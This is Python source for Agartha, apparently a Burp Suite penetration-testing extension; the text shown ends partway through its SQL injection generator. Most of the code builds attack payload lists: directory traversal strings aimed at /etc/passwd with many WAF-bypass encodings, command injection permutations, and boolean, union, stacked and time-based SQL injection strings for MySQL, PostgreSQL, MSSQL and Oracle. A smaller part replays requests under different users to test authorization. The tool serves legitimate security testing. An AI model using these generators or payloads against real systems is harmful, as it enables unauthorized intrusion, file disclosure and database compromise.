"""
Author: Volkan Dindar
        volkan.dindar@owasp.org
        https://github.com/volkandindar/agartha
"""
try:
    import sys, re, urlparse, random, os, urllib, posixpath
    from burp import (IBurpExtender, ITab, IMessageEditorController, IContextMenuFactory)
    from java.awt import (BorderLayout, FlowLayout, Color, Font, Dimension, Toolkit)
    from javax.swing import (JCheckBox, JMenuItem, JTextPane, JTable, JScrollPane, JProgressBar, SwingConstants, JComboBox, JButton, JTextField, JSplitPane, JPanel, JLabel, JRadioButton, ButtonGroup, JTabbedPane, BoxLayout, JEditorPane)
    from javax.swing.border import EmptyBorder
    from javax.swing.table import (DefaultTableModel, TableCellRenderer)
    from java.util import ArrayList
    from threading import Thread
    from java.awt.datatransfer import StringSelection
except:
    print "==== ERROR ====" + "\n\nFailed to load dependencies.\n" +str(sys.exc_info()[1]) +"\n\n==== ERROR ====\n\n"

VERSION = "1.0"

class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFactory):
    
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        self._callbacks.setExtensionName("Agartha - LFI, RCE, SQLi, Auth Matrix, HTTP to JS")
        self._MainTabs = JTabbedPane()
        self._tabDictUI()
        self._tabAuthUI()
        self._tabHelpUI()
        self._MainTabs.addTab("Payload Generator", None, self._tabDictPanel, None)
        self._MainTabs.addTab("Authorization Matrix", None, self._tabAuthSplitpane, None)
        self._MainTabs.addTab("Help", None, self._tabHelpJPanel, None)
        callbacks.addSuiteTab(self)
        callbacks.registerContextMenuFactory(self)
        callbacks.issueAlert("The extension has been loaded.")
        self.tableMatrixReset(self)
        print "Agartha(v" + VERSION + ") is a security tool for:\n\t\t* Local File Inclusion, Directory Traversal\n\t\t* Command Injection, RCE\n\t\t* SQL Injections\n\t\t* Access Violations, Authentication/Authorization Matrix\n\t\t* Http request to Javascript conversion\n\nFor more information and tutorial, please visit:\n\t\thttps://github.com/volkandindar/agartha\n\nAuthor:\n\t\tVolkan Dindar\n\t\tvolkan.dindar@owasp.org"
        return

    def authMatrixThread(self, ev):
        self._cbAuthColoringFunc(self)
        self._requestViewer.setMessage("", False)
        self._responseViewer.setMessage("", False)
        self._lblAuthNotification.text = " "
        self._tbAuthNewUser.setForeground (Color.black)
        self._btnAuthNewUserAdd.setEnabled(False)
        self._btnAuthRun.setEnabled(False)
        self._cbAuthColoring.setEnabled(False)
        self._btnAuthReset.setEnabled(False)
        self._cbAuthGETPOST.setEnabled(False)
        self.progressBar.setValue(0)
        self.httpReqRes = [[],[],[],[],[]]
        self.httpReqRes.append([])
        self.tableMatrix.clearSelection()
        for x in range(0, self.tableMatrix.getRowCount()):
            for y in range(1, self.tableMatrix.getColumnCount()):
                self.tableMatrix.setValueAt("", x, y)
        
        i = 1000000 / ( self.tableMatrix.getRowCount() * (self.tableMatrix.getColumnCount()-1) )

        for x in range(0, self.tableMatrix.getRowCount()):
            for y in range(1, self.tableMatrix.getColumnCount()):
                self.tableMatrix.setValueAt(self.makeHttpCall(self.tableMatrix.getValueAt(x, 0), self.tableMatrix.getColumnName(y)), x, y)
                self.progressBar.setValue(self.progressBar.getValue() + i)
        
        self._customRenderer =  UserEnabledRenderer(self.tableMatrix.getDefaultRenderer(str), self.userNamesHttpUrls)
        self._customTableColumnModel = self.tableMatrix.getColumnModel()
        for y in range(0, self.tableMatrix.getColumnCount()):
            self._customTableColumnModel.getColumn (y).setCellRenderer (self._customRenderer)
        self.tableMatrix.repaint()
        self.tableMatrix.setSelectionForeground(Color.red)
        self._btnAuthNewUserAdd.setEnabled(True)
        self._btnAuthRun.setEnabled(True)
        self._cbAuthColoring.setEnabled(True)
        self._btnAuthReset.setEnabled(True)
        self._cbAuthGETPOST.setEnabled(True)
        self.progressBar.setValue(1000000)
        self._lblAuthNotification.text = "Blue, Green, Purple and Beige colors are representation of users. Yellow, Orange and Red cell colors show warning levels."        
        return

    def makeHttpCall(self, urlAdd, userID):
        try:
            userID = self.userNames.index(userID)
            header = self.userNamesHttpReq[userID]

            # changing url in the request header
            if str(urlparse.urlparse(urlAdd).path):
                # check if query string exists
                if str(urlparse.urlparse(urlAdd).query):
                    header = header.replace(" " + header.splitlines()[0].split(" ", 2)[1], " " + str(urlparse.urlparse(urlAdd).path + "?" + urlparse.urlparse(urlAdd).query))
                else:
                    header = header.replace(" " + header.splitlines()[0].split(" ", 2)[1], " " + str(urlparse.urlparse(urlAdd).path))
            else:
                header = header.replace(" " + header.splitlines()[0].split(" ", 2)[1], " " + "/")

            # header methods
            if "GET" in header[:3]:
                # request was in GET method and will be in POST
                if self._cbAuthGETPOST.getSelectedIndex() == 1:
                    header = self._callbacks.getHelpers().toggleRequestMethod((header))
            else:
                # request was in POST alike method and will be in GET
                if self._cbAuthGETPOST.getSelectedIndex() == 0:
                    header = self._callbacks.getHelpers().toggleRequestMethod((header))

            portNum = 80
            if urlparse.urlparse(urlAdd).port:
                portNum = urlparse.urlparse(urlAdd).port
            else:
                if urlparse.urlparse(urlAdd).scheme == "https":
                    portNum = 443
    
            _httpReqRes = self._callbacks.makeHttpRequest(self._helpers.buildHttpService(urlparse.urlparse(urlAdd).hostname, portNum, urlparse.urlparse(urlAdd).scheme), header)
            self.httpReqRes[userID].append(_httpReqRes)
            
            return "HTTP " + str(self._helpers.analyzeResponse(self._helpers.bytesToString(_httpReqRes.getResponse())).getStatusCode()) + " : " + format(len(self._helpers.bytesToString(_httpReqRes.getResponse())) - self._helpers.analyzeResponse(self._helpers.bytesToString(_httpReqRes.getResponse())).getBodyOffset(), ',d') + " bytes"
        except:
            return str(sys.exc_info()[1])

    def authAdduser(self, ev):
        if self.userCount == 4:
            self._lblAuthNotification.text = "You can add up to 4 users"
            return
        
        for _url in self._tbAuthURL.getText().split('\n'):
            _url = _url.strip()
            if not self.isURLValid(str(_url)) or _url == self._txtURLDefault:
                self._tbAuthURL.setForeground (Color.red)
                self._lblAuthNotification.text = "URLs should start with 'http/s' and not have any spaces. Please check: '" + _url + "'"
                self._lblAuthNotification.setForeground (Color.red)
                return
        self._tbAuthURL.setForeground (Color.black)

        if not self._tbAuthHeader.getText().strip() or self._tbAuthHeader.getText().strip() == self._txtHeaderDefault:
            self._tbAuthHeader.setForeground (Color.red)
            self._lblAuthNotification.text = "Please provide a valid header!"
            self._lblAuthNotification.setForeground (Color.red)
            return
        self._tbAuthHeader.setForeground (Color.black)

        if self._tbAuthNewUser.text.strip() in self.userNames or not self._tbAuthNewUser.text.strip() or len(self._tbAuthNewUser.text.strip()) > 20:
            self._tbAuthNewUser.setForeground (Color.red)
            self._lblAuthNotification.text = "Please add another user name, that must be unique and less then 20 chars!"
            self._lblAuthNotification.setForeground (Color.red)
            return
        self._tbAuthNewUser.setForeground (Color.black)

        if self.userCount == 0:
            # header for unauth user
            unauthHeader = self._tbAuthHeader.getText().split('\n')[0] + "\n" + self._tbAuthHeader.getText().split('\n')[1]
            for line in self._tbAuthHeader.getText().split('\n')[2:]:
                if not any(re.findall(r'cookie|token|auth', line, re.IGNORECASE)):
                    unauthHeader +=  "\n" + line
                if not line:
                    break
            self.userNamesHttpReq[0] = unauthHeader
        
        self.userCount = self.userCount + 1
        self.userNames.append(self._tbAuthNewUser.text.strip())
        self.userNamesHttpReq.append(self._tbAuthHeader.getText())
        self.tableMatrix_DM.addColumn(self._tbAuthNewUser.text.strip())
        self.userNamesHttpUrls.append([])

        urlList = []
        for x in range(0, self.tableMatrix.getRowCount()):
                urlList.append(str(self.tableMatrix.getValueAt(x, 0)))
        for _url in set(self._tbAuthURL.getText().split('\n')):
            _url = _url.strip()
            _ext = os.path.splitext(urlparse.urlparse(_url).path)[1]
            if _url and not any(re.findall(r'(log|sign|time).*(off|out|in|on)|(error|expire|kill|terminat|delete|remove)', _url, re.IGNORECASE)) and not any(re.findall(r'^\.(gif|jpg|jpeg|png|css|js|ico|svg|eot|woff|woff2|ttf)$', _ext, re.IGNORECASE)):
                # ignore logout, signoff, etc. paths
                if _url not in self.userNamesHttpUrls[self.userCount]:
                    # check first if the url exist in user's url list
                    self.userNamesHttpUrls[self.userCount].append(_url)
                    if _url not in urlList:
                        # check table if url exists
                        self.tableMatrix_DM.addRow([_url])
        
        self._tbAuthURL.setText(self._tbAuthURL.getText().split('\n')[0]+"\n")
        self._btnAuthRun.setEnabled(True)
        self._btnAuthReset.setEnabled(True)
        self._lblAuthNotification.text = "'" + self._tbAuthNewUser.text.strip() + "'' added successfully! Possible session terminators (log|sign|time - off|out|in|on), and file extensions (gif, jpg, jpeg, png, css, js, ico, svg, eot, woff, woff2, ttf) have been filtered out!"
        self._lblAuthNotification.setForeground (Color.black)
        self._cbAuthColoring.setEnabled(True)
        self._cbAuthGETPOST.setEnabled(True)
        self.tableMatrix.repaint()
        self.tableMatrix.setSelectionForeground(Color.red)
        self._customRenderer =  UserEnabledRenderer(self.tableMatrix.getDefaultRenderer(str), self.userNamesHttpUrls)
        self._customTableColumnModel = self.tableMatrix.getColumnModel()
        for y in range(0,self.tableMatrix.getColumnCount()):
            self._customTableColumnModel.getColumn (y).setCellRenderer (self._customRenderer)

        return

    def _cbAuthColoringFunc(self, ev):
        global _colorful
        if self._cbAuthColoring.isSelected():
            _colorful = True
        else:
            _colorful = False

        self.tableMatrix.repaint()
        return

    def _cbUnionBasedFunc(self, ev):
        if self._cbUnionBased.isSelected(): 
            self._cbUnionDepth.setEnabled(True)
        else:
            self._cbUnionDepth.setEnabled(False)
        return

    def funcGeneratePayload(self, ev):
        self._lblStatusLabel.setForeground (Color.red)
        self._tabDictResultDisplay.setText("")
        if self._rbDictSQLi.isSelected():            
            self._txtTargetPath.setText(self._txtDefaultSQLi)
        elif not self.isValid():
            if self._rbDictLFI.isSelected():
                self._lblStatusLabel.setText("File input is not valid. "+ self._txtDefaultLFI)
                self._txtTargetPath.setText(random.choice(["/etc/passwd", "C:\\windows\\system32\\drivers\\etc\\hosts"]))
            elif self._rbDictCommandInj.isSelected():
                self._lblStatusLabel.setText("Command input is not valid. " + self._txtDefaultCommandInj)
                self._txtTargetPath.setText(random.choice(["sleep 120", "timeout 120"]))
            return 

        self._lblStatusLabel.setForeground (Color.black)
        self._txtTargetPath.text = self._txtTargetPath.text.strip()
        self._lblStatusLabel.setText("")
        if self._rbDictCommandInj.isSelected():
            self.funcCommandInj(self)
        if self._rbDictLFI.isSelected():
            self.funcLFI(self)
        if self._rbDictSQLi.isSelected():
            self.funcSQLi(self)            
        return
       
    def isValid(self):
        # input should not be empty, should contain at least one alphanumeric char and less than 250 length
        if self._txtTargetPath.text.strip() and re.compile("[0-9a-zA-Z]").findall(self._txtTargetPath.text) and self._txtTargetPath.text.strip() !=self._txtDefaultLFI and self._txtTargetPath.text.strip() !=self._txtDefaultCommandInj and len(self._txtTargetPath.text.strip()) < 250:
            # clear
            return True
        else:
            return False

    def funcRBSelection(self, ev):
        self._lblStatusLabel.setForeground (Color.black)
        self._lblStatusLabel.setText("")
        self._tabDictPanel_LFI.setVisible(False)
        self._cbDictCommandInjOpt.setVisible(False)
        self._tabDictPanel_SQLType.setVisible(False)
        self._tabDictPanel_SQLi.setVisible(False)
        self._tabDictPanel_SQLOptions.setVisible(False)
        self._tabDictResultDisplay.setText("")
        if self._rbDictLFI.isSelected():
            self._txtTargetPath.setText(self._txtDefaultLFI)
            self._tabDictResultDisplay.setText(self._txtCheatSheetLFI)
            self._tabDictPanel_LFI.setVisible(True)
            self._lblStatusLabel.setText("Please provide a path to generate payloads!")
        elif self._rbDictCommandInj.isSelected():
            self._txtTargetPath.setText(self._txtDefaultCommandInj)
            self._tabDictResultDisplay.setText(self._txtCheatSheetCommandInj)
            self._cbDictCommandInjOpt.setVisible(True)
            self._lblStatusLabel.setText("Please provide a command to generate payloads!")
        elif self._rbDictSQLi.isSelected():
            self._txtTargetPath.setText(self._txtDefaultSQLi)
            self._tabDictPanel_SQLType.setVisible(True)
            self._tabDictPanel_SQLi.setVisible(True)
            self._tabDictPanel_SQLOptions.setVisible(True)
            self.funcSQLi(self)
        return

    def funcCommandInj(self, ev):
        listCommandInj = []        
        prefixes = ["", "\\n", "\\\\n", "\\r\\n", "\\\\r\\\\n", "%0a", "%0d%0a"]
        escapeChars = ["",  "'", "\\'", "\\\\'", "\"", "\\\"", "\\\\\""]
        separators = ["&", "&&", "|", "||", ";"]
        
        for prefix in prefixes:
            for escapeChar in escapeChars:
                if (prefix[:2].count("\\")) and (escapeChar[:2].count("\\")):
                    if (prefix[:2].count("\\") != escapeChar[:2].count("\\")):
                        continue
                for separator in separators:
                    listCommandInj.append(prefix + escapeChar + separator + self._txtTargetPath.text + separator + escapeChar + "\n")
                    listCommandInj.append(prefix + escapeChar + separator + self._txtTargetPath.text + escapeChar + "\n")
                    listCommandInj.append(prefix + escapeChar + separator + escapeChar + self._txtTargetPath.text + "\n")
                    listCommandInj.append(prefix + escapeChar + separator + "`" + self._txtTargetPath.text + "`" + separator + escapeChar + "\n")
                    listCommandInj.append(prefix + escapeChar + separator + "`" + self._txtTargetPath.text + "`" + escapeChar + "\n")
                listCommandInj.append(prefix + separator + "`" + self._txtTargetPath.text + "`" + separator + "\n")
                listCommandInj.append(prefix + separator + "`" + self._txtTargetPath.text + "`" + "\n")
            listCommandInj.append(prefix + self._txtTargetPath.text + "\n")
            listCommandInj.append(prefix + "`" + self._txtTargetPath.text + "`" + "\n")

        listCommandInj = list(set(listCommandInj))
        listCommandInj.sort(reverse=True)
        
        if self._cbDictCommandInjEncoding.isSelected():
            listCommandInj = self.encodeURL(listCommandInj)
        
        self._tabDictResultDisplay.setText(''.join(map(str, listCommandInj)))
        self._lblStatusLabel.setText('Payload list for "' + self._txtTargetPath.text + '" command returns with '+ str(len(listCommandInj)) + ' result.')
        return

    def funcLFI(self, ev):
        listLFI = []
        dept = int(self._cbDictDepth.getSelectedItem())
        
        if self._txtTargetPath.text.startswith('/') or self._txtTargetPath.text.startswith('\\'):
            self._txtTargetPath.text = self._txtTargetPath.text[1:]
        
        filePath = self._txtTargetPath.text.replace("\\","/")
        
        counter = 0
        if self._cbDictEquality.isSelected():
            counter = dept

        while counter <= dept:
            _upperDirectory = ""
            i = 1
            while i <= counter:
                _upperDirectory += "../"
                i = i + 1
                listLFI.append(_upperDirectory + filePath + "\n")

            if self._cbDictWafBypass.isSelected():
                listLFI.append((_upperDirectory + filePath).replace("..", "...") + "\n")
                listLFI.append((_upperDirectory + filePath).replace("..", "....") + "\n")
                listLFI.append((_upperDirectory + self._txtTargetPath.text).replace("..", "...") + "\n")
                listLFI.append((_upperDirectory + self._txtTargetPath.text).replace("..", "....") + "\n")

                prefixes = ["/", "\\", "/..;/", "..;/", ".//"]
                for prefix in prefixes:
                    listLFI.append(prefix + _upperDirectory + filePath + "\n")
                    if not "\\" in prefix and not "/..;/" in prefix :
                        listLFI.append(_upperDirectory + prefix + filePath + "\n")

                suffixes = ["%00index.html", "%20index.html", "%09index.html", "%0Dindex.html", "%FFindex.html", "%00", "%20", "%09", "%0D", "%FF", ";index.html", "%00.jpg", "%00.jpg", "%20.jpg", "%09.jpg", "%0D.jpg", "%FF.jpg"]
                for suffix in suffixes:
                    listLFI.append(_upperDirectory + filePath + suffix + "\n")

                if "\\" in self._txtTargetPath.text:
                    listLFI.append(_upperDirectory.replace("/", "\\") + self._txtTargetPath.text + "\n")
                    listLFI.append(_upperDirectory.replace("/", "\\").replace("..", "...") + self._txtTargetPath.text + "\n")
                    listLFI.append(_upperDirectory.replace("/", "\\").replace("..", "....") + self._txtTargetPath.text + "\n")
                    listLFI.append(_upperDirectory.replace("/", "\\\\") + self._txtTargetPath.text + "\n")
                    listLFI.append((_upperDirectory + filePath).replace("/", "\\\\") + "\n")
                    listLFI.append(_upperDirectory + self._txtTargetPath.text.replace("/", "\\\\") + "\n")
                    for suffix in suffixes:
                        listLFI.append((_upperDirectory + filePath).replace("/", "\\\\") + suffix + "\n")
                        listLFI.append((_upperDirectory + filePath).replace("/", "\\") + suffix + "\n")

                _slashes = ["..././", "...\\.\\"]
                for _slash in _slashes:
                    listLFI.append(_upperDirectory.replace("../", _slash) + filePath + "\n")

                _slashes = ["\\", "\\\\", "\\\\\\", "//", "///", "\\/"]
                for _slash in _slashes:
                    listLFI.append(_upperDirectory.replace("/", _slash) + filePath + "\n")
                    listLFI.append(_upperDirectory.replace("/", _slash) + self._txtTargetPath.text + "\n")                    
                    if "\\" in self._txtTargetPath.text:
                        listLFI.append(_upperDirectory[:-1].replace("/", _slash) + "\\" + self._txtTargetPath.text + "\n")
                    else:
                        listLFI.append(_upperDirectory[:-1].replace("/", _slash) + "/" + filePath + "\n")
                    listLFI.append((_upperDirectory + filePath).replace("/", _slash) + "\n")

                _slashes = ["%2f", "%5c"   , "%252f"     , "%c0%af"      , "%u2215"      , "%u2216"      , "%u2215"      , "%u2216"      , "%c0%af"      , "%c0%5c"      , "%e0%80%af"         , "%c0%80%5c"         , "%c0%2f"    , "%252f"     , "%255c"     , "%25c0%25af"          , "%c1%9c"      , "%25c1%259c"          , "%%32%66"       , "%%35%63"       , "%uEFC8", "%uF025", "0x2f"    , "0x5c"    , "%c0%2f"      , "%c0%5c"]
                _dots = ["%2e%2e", "%2e%2e", "%252e%252e", "%c0%ae%c0%ae", "%uff0e%uff0e", "%uff0e%uff0e", "%u002e%u002e", "%u002e%u002e", "%c0%2e%c0%2e", "%c0%2e%c0%2e", "%e0%40%ae%e0%40%ae", "%e0%40%ae%e0%40%ae", "%c0ae%c0ae", "%252e%252e", "%252e%252e", "%25c0%25ae%25c0%25ae", "%c0%ae%c0%ae", "%25c0%25ae%25c0%25ae", "%%32%65%%32%65", "%%32%65%%32%65", ".."    , ".."    , "0x2e0x2e", "0x2e0x2e", "%c0%2e%c0%2e", "%c0%2e%c0%2e"]
                for i in range(len(_slashes)):
                    listLFI.append((_upperDirectory).replace("/", _slashes[i]) + filePath + "\n")
                    listLFI.append((_upperDirectory)[:-1].replace("/", _slashes[i]) + "/" + filePath + "\n")
                    listLFI.append((_upperDirectory + filePath).replace("/", _slashes[i]) + "\n")
                    listLFI.append((_upperDirectory).replace("/", _slashes[i]).replace("..", _dots[i]) + filePath + "\n")
                    listLFI.append((_upperDirectory)[:-1].replace("/", _slashes[i]).replace("..", _dots[i]) + "/" + filePath + "\n")
                    listLFI.append((_upperDirectory + filePath).replace("/", _slashes[i]).replace("..", _dots[i]) + "\n")                    
                    listLFI.append((_upperDirectory).replace("..", _dots[i]) + filePath + "\n")

            counter = counter + 1

        listLFI = list(set(listLFI))
        listLFI.sort(reverse=True)
        self._tabDictResultDisplay.setText(''.join(map(str, listLFI)))
        self._lblStatusLabel.setText('Payload list for "' + self._txtTargetPath.text + '" path returns with '+ str(len(listLFI)) + ' result. Please make sure payload encoding is disabled, unless you are sure what you are doing.') 
        return

    def funcSQLi(self, ev):
        self._lblStatusLabel.setForeground (Color.black)
        if self._cbTimeBased.isSelected() or self._cbStackedSQL.isSelected() or self._cbUnionBased.isSelected():
            if not self._cbMysqlBased.isSelected() and not self._cbMssqlBased.isSelected() and not self._cbPostgreBased.isSelected() and not self._cbOracleBased.isSelected():
                self._lblStatusLabel.setForeground (Color.red)
                self._lblStatusLabel.setText('There is no a generic method exists for this choice! Please also pick a database!')
                self._tabDictResultDisplay.setText('')
                return
        if not (self._cbTimeBased.isSelected() or self._cbStackedSQL.isSelected() or self._cbUnionBased.isSelected() or self._cbBooleanBased.isSelected()):
                self._lblStatusLabel.setForeground (Color.red)
                self._lblStatusLabel.setText('There is no a generic method exists for this choice! Please also pick an attack type!')
                self._tabDictResultDisplay.setText('')
                return

        listSQLi = []
        prefixes = ["", "\\n", "\\\\n", "\\r\\n", "\\\\r\\\\n", "%0a", "0x0a", "%0d%0a", "0x0d0a", "%00", "0x00"]
        escapeChars = ["", "'", "\\'", "\\\\'"]
        if not self._cbSqlWafBypass.isSelected():
            prefixes = [""]
            escapeChars = ["", "'"]
        n1 = str(random.randint(10, 70))
        n2 = str(random.randint(71, 99))
        boolExpressions = [n1 + "=" + n1, n1 + "<" + n2]
        
        suffixes = ["", " -- "]

        if self._cbBooleanBased.isSelected():
            for prefix in prefixes:
                for escapeChar in escapeChars:
                    if (prefix[:2].count("\\")) and (escapeChar[:2].count("\\")):
                        if (prefix[:2].count("\\") != escapeChar[:2].count("\\")):
                            continue
                    for boolExpression in boolExpressions:
                        for suffix in suffixes[1:]:
                            listSQLi.append(prefix + escapeChar + " or " + boolExpression + suffix + "\n")
                            if not escapeChar:
                                listSQLi.append(prefix + " or " + boolExpression + "\n")
            for prefix in prefixes:
                for escapeChar in escapeChars[1:]:
                    if (prefix[:2].count("\\")) and (escapeChar[:2].count("\\")):
                        if (prefix[:2].count("\\") != escapeChar[:2].count("\\")):
                            continue
                    for suffix in suffixes[1:]:
                        listSQLi.append(prefix + escapeChar + " or " + escapeChar + "xyz" + escapeChar + "=" + escapeChar + "xyz" + "\n")
                        listSQLi.append(prefix + escapeChar + " or " + escapeChar + "xyz" + escapeChar + "=" + escapeChar + "xyz" + escapeChar + suffix + "\n")
                        listSQLi.append(prefix + " or " + escapeChar + "xyz" + escapeChar + "=" + escapeChar + "xyz" + escapeChar + "\n")
                        listSQLi.append(prefix + " or " + escapeChar + "xyz" + escapeChar + "=" + escapeChar + "xyz" + escapeChar + suffix + "\n")

        unions = ["null", "1337", "'1337'"]
        if self._cbUnionBased.isSelected():
            for prefix in prefixes:
                for escapeChar in escapeChars:
                    if (prefix[:2].count("\\")) and (escapeChar[:2].count("\\")):
                        if (prefix[:2].count("\\") != escapeChar[:2].count("\\")):
                            continue
                    for suffix in suffixes[1:]:
                        for union in unions:
                            unionPhrase = " union all select "
                            for i in range(int(self._cbUnionDepth.getSelectedItem())):
                                unionPhrase += union
                                if self._cbMysqlBased.isSelected():
                                    listSQLi.append(prefix + escapeChar + unionPhrase + suffix + "\n")
                                    if not escapeChar:
                                        listSQLi.append(prefix + unionPhrase + "\n")
                                    if self._cbTimeBased.isSelected():
                                        listSQLi.append(prefix + escapeChar + unionPhrase.replace("select " + union, "select sleep(120)") + suffix + "\n")
                                        if not escapeChar:
                                            listSQLi.append(prefix + unionPhrase.replace("select " + union, "select sleep(120)") + "\n")
                                if self._cbPostgreBased.isSelected():
                                    listSQLi.append(prefix + escapeChar + unionPhrase + suffix + "\n")
                                    if not escapeChar:
                                        listSQLi.append(prefix + unionPhrase + "\n")
                                    if self._cbTimeBased.isSelected():
                                        listSQLi.append(prefix + escapeChar + unionPhrase.replace("select null", "select (select 1337 from pg_sleep(120))") + suffix + "\n")
                                        listSQLi.append(prefix + escapeChar + unionPhrase.replace("select " + union, "select cast(pg_sleep(120) as text)") + suffix + "\n")
                                        listSQLi.append(prefix + escapeChar + unionPhrase.replace("select " + union, "select cast(pg_sleep(120) as integer)") + suffix + "\n")
                                        if not escapeChar:
                                            listSQLi.append(prefix + unionPhrase.replace("select null", "select (select 1337 from pg_sleep(120))") + "\n")
                                            listSQLi.append(prefix + unionPhrase.replace("select " + union, "select cast(pg_sleep(120) as text)") + "\n")
                                            listSQLi.append(prefix + unionPhrase.replace("select " + union, "select cast(pg_sleep(120) as integer)") + "\n")
                                if self._cbMssqlBased.isSelected():
                                    listSQLi.append(prefix + escapeChar + unionPhrase + suffix + "\n")
                                    if not escapeChar:
                                        listSQLi.append(prefix + unionPhrase + "\n")
                                    if self._cbTimeBased.isSelected():
                                        if escapeChar:
                                            listSQLi.append(prefix + escapeChar + unionPhrase + " waitfor delay " + escapeChar + "00:02" + escapeChar + suffix + "\n")
                                        else:
                                            listSQLi.append(prefix + unionPhrase + " waitfor delay '00:02'" + "\n")
                                            if self._cbSqlWafBypass.isSelected():
                                                listSQLi.append(prefix + unionPhrase + " waitfor delay \\'00:02\\'" + "\n")
                                if self._cbOracleBased.isSelected():
                                    listSQLi.append(prefix + escapeChar + unionPhrase + " from dual" + suffix + "\n")
                                    if not escapeChar:
                                        listSQLi.append(prefix + unionPhrase + " from dual" + "\n")
                                    if self._cbTimeBased.isSelected():
                                        if escapeChar:
                                            listSQLi.append(prefix + escapeChar + unionPhrase.replace("select " + union, "select "+ "dbms_pipe.receive_message((" + escapeChar + "a" + escapeChar + "),120)") + " from dual" + suffix + "\n")                                            
                                            listSQLi.append(prefix + escapeChar + unionPhrase.replace("select " + union, "select "+ "dbms_pipe.receive_message(1,120)") + " from dual" + suffix + "\n")
                                            listSQLi.append(prefix + escapeChar + unionPhrase.replace("select " + union, "select "+ "cast(dbms_pipe.receive_message((" + escapeChar + "a" + escapeChar + "),120) as varchar2(10))") + " from dual" + suffix + "\n")
                                            listSQLi.append(prefix + escapeChar + unionPhrase.replace("select " + union, "select "+ "cast(dbms_pipe.receive_message((" + escapeChar + "a" + escapeChar + "),120) as integer)") + " from dual" + suffix + "\n")
                                            listSQLi.append(prefix + escapeChar + unionPhrase.replace("select " + union, "select "+ "cast(dbms_pipe.receive_message(1,120) as varchar2(10))") + " from dual" + suffix + "\n")
                                            listSQLi.append(prefix + escapeChar + unionPhrase.replace("select " + union, "select "+ "cast(dbms_pipe.receive_message(1,120) as integer)") + " from dual" + suffix + "\n")
                                        else:
                                            listSQLi.append(prefix + unionPhrase.replace("select " + union, "select "+ "dbms_pipe.receive_message(('a'),120)") + " from dual" + suffix + "\n")
                                            listSQLi.append(prefix + unionPhrase.replace("select " + union, "select "+ "dbms_pipe.receive_message(('a'),120)") + " from dual" + "\n")
                                            listSQLi.append(prefix + unionPhrase.replace("select " + union, "select "+ "dbms_pipe.receive_message(1,120)") + " from dual" + suffix + "\n")
                                            listSQLi.append(prefix + unionPhrase.replace("select " + union, "select "+ "dbms_pipe.receive_message(1,120)") + " from dual" + "\n")
                                            listSQLi.append(prefix + unionPhrase.replace("select " + union, "select "+ "cast(dbms_pipe.receive_message(('a'),120) as varchar2(10))") + " from dual" + suffix + "\n")
                                            listSQLi.append(prefix + unionPhrase.replace("select " + union, "select "+ "cast(dbms_pipe.receive_message(('a'),120) as integer)") + " from dual" + suffix + "\n")
                                            listSQLi.append(prefix + unionPhrase.replace("select " + union, "select "+ "cast(dbms_pipe.receive_message(('a'),120) as varchar2(10))") + " from dual" + "\n")
                                            listSQLi.append(prefix + unionPhrase.replace("select " + union, "select "+ "cast(dbms_pipe.receive_message(('a'),120) as integer)") + " from dual" + "\n")
                                            listSQLi.append(prefix + unionPhrase.replace("select " + union, "select "+ "cast(dbms_pipe.receive_message(1,120) as varchar2(10))") + " from dual" + suffix + "\n")
                                            listSQLi.append(prefix + unionPhrase.replace("select " + union, "select "+ "cast(dbms_pipe.receive_message(1,120) as integer)") + " from dual" + suffix + "\n")
                                            listSQLi.append(prefix + unionPhrase.replace("select " + union, "select "+ "cast(dbms_pipe.receive_message(1,120) as varchar2(10))") + " from dual" + "\n")
                                            listSQLi.append(prefix + unionPhrase.replace("select " + union, "select "+ "cast(dbms_pipe.receive_message(1,120) as integer)") + " from dual" + "\n")
                                            if self._cbSqlWafBypass.isSelected():
                                                listSQLi.append(prefix + unionPhrase.replace("select " + union, "select "+ "dbms_pipe.receive_message((\\'a\\'),120)") + " from dual" + suffix + "\n")
                                                listSQLi.append(prefix + unionPhrase.replace("select " + union, "select "+ "dbms_pipe.receive_message((\\'a\\'),120)") + " from dual" + "\n")
                                                listSQLi.append(prefix + unionPhrase.replace("select " + union, "select "+ "cast(dbms_pipe.receive_message((\\'a\\'),120) as varchar2(10))") + " from dual" + suffix + "\n")
                                                listSQLi.append(prefix + unionPhrase.replace("select " + union, "select "+ "cast(dbms_pipe.receive_message((\\'a\\'),120) as integer)") + " from dual" + suffix + "\n")
                                                listSQLi.append(prefix + unionPhrase.replace("select " + union, "select "+ "cast(dbms_pipe.receive_message((\\'a\\'),120) as varchar2(10))") + " from dual" + "\n")
                                                listSQLi.append(prefix + unionPhrase.replace("select " + union, "select "+ "cast(dbms_pipe.receive_message((\\'a\\'),120) as integer)") + " from dual" + "\n")
                                unionPhrase += ","

        for prefix in prefixes:
            for escapeChar in escapeChars:
                if (prefix[:2].count("\\")) and (escapeChar[:2].count("\\")):
                    if (prefix[:2].count("\\") != escapeChar[:2].count("\\")):
                        continue
                for suffix in suffixes[1:]:
                    if self._cbOracleBased.isSelected():
                        if self._cbStackedSQL.isSelected():
                            if escapeChar:
                                listSQLi.append(prefix + escapeChar + ";select banner from v$version" + suffix + "\n")
                                listSQLi.append(prefix + escapeChar + ";select version from v$instance" + suffix + "\n")
                            else:
                                listSQLi.append(prefix + ";select banner from v$version" + "\n")
                                listSQLi.append(prefix + ";select version from v$instance" + "\n")
                                listSQLi.append(prefix + ";select banner from v$version" + suffix + "\n")
                                listSQLi.append(prefix + ";select version from v$instance" + suffix + "\n")
                        if self._cbTimeBased.isSelected():
                            if escapeChar:
                                listSQLi.append(prefix + escapeChar + ";select case when " + n1 + "=" + n1 +" then " + escapeChar + "a" + escapeChar + "||dbms_pipe.receive_message((" + escapeChar + "a" + escapeChar + "),120) else null end from dual " + suffix + "\n")
                                listSQLi.append(prefix + escapeChar + " and 1337=dbms_pipe.receive_message((" + escapeChar + "a" + escapeChar + "),120)" + suffix + "\n")
                                listSQLi.append(prefix + " and 1337=dbms_pipe.receive_message((" + escapeChar + "a" + escapeChar + "),120)" + suffix + "\n")
                                listSQLi.append(prefix + " and 1337=dbms_pipe.receive_message((" + escapeChar + "a" + escapeChar + "),120)" + "\n")
                                listSQLi.append(prefix + escapeChar + " or 1337=dbms_pipe.receive_message((" + escapeChar + "a" + escapeChar + "),120)" + suffix + "\n")
                                listSQLi.append(prefix + " or 1337=dbms_pipe.receive_message((" + escapeChar + "a" + escapeChar + "),120)" + suffix + "\n")
